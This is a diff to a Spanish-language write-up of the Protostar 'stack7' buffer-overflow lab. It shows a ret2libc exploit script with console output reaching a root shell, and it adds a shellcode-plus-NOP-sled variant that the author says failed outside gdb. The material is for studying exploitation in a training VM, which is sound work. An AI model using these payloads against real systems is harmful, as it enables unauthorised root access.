@@ -521,40 +521,35 @@ Resulta ser que la direccion de system empeiza por 0xb algo, asi que nos la chap
 ```python
 import struct
 padding = "A" * 80
-ret = struct.pack("I", 0x08048544)  # Lo único nuevo
+ret = struct.pack("I", 0x08048544)  
 system = struct.pack("I",0xb7ecffb0)
 exit = struct.pack("I",0xb7ec60c0)
 bin_sh = struct.pack("I",0xb7fb63bf)
 print(padding + ret + system + exit + bin_sh)
 ```
+Lo unico nuevo es la linea de "ret = struct.pack("I", 0x08048544)"
+
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py;cat) | ./stack7
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD�����`췿c��
 whoami
 root
 ```
-
-------------------------------------------
-
-EN CONSTRUCCION
-
-
-# Extra ROP programming -> POP POP RET
-[Fuente](https://decepticode.wordpress.com/2018/09/08/protostar-stack7/)
-
-La instruccion pop pop ret pasa dos argumentos (uno por POP) a la funcion a la que apunta RET.
-¿Y como lo hace? POP en ensamblador saca un valor de la pila y lo mete en un registro. Resulta ser que para pasarle argumentos a una funcion, estos se tienen que meter en dichos registros ¿CUales? los que nos digan las calling conventions.
+Con shellcode sería asi, contando con que mi eip es "0xbffff69c"
 
 ```console
-[user@protostar]-[/opt/protostar/bin]:$ objdump -d /opt/protostar/bin/stack7 | grep -ne "pop * %ebx" -A2
-124: 8048492:   5b                      pop    %ebx
-125- 8048493:   5d                      pop    %ebp
-126- 8048494:   c3                      ret    
+import struct
+padding = "A" * 80
+ret = struct.pack("I", 0x08048544)
+eip = struct.pack("I",0xbffff69c +20)
+nops = "\x90"*80
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+shellcode += "\x53\x68/tty\x68/dev\x89\xe3\x31"
+shellcode += "\xc9\x66\xb9\x12\x27\xb0\x05\xcd"
+shellcode += "\x80\x31\xc0\x50\x68//sh\x68/bin"
+shellcode += "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+print(padding + ret + eip + nops + shellcode)
 ```
-Tambien salia otro igual en la direccion 0x80485f7 pero nos vamos a quedar con 0x8048492
-Despues de POP-POP-RET hay que meterle las tres cosas (dos a las que hará POP "argumentos" y otro a la que hara RET "función") 
-
-# Extra ROP programming -> CALL EAX
-
-
+El problema de haberlo hecho asi es que fuera de gdb no me ha funcionado, ni cambiando la suma del eip o el numero de nops, asi que me quedo con 
+la solución de antes (ret2libc)
 
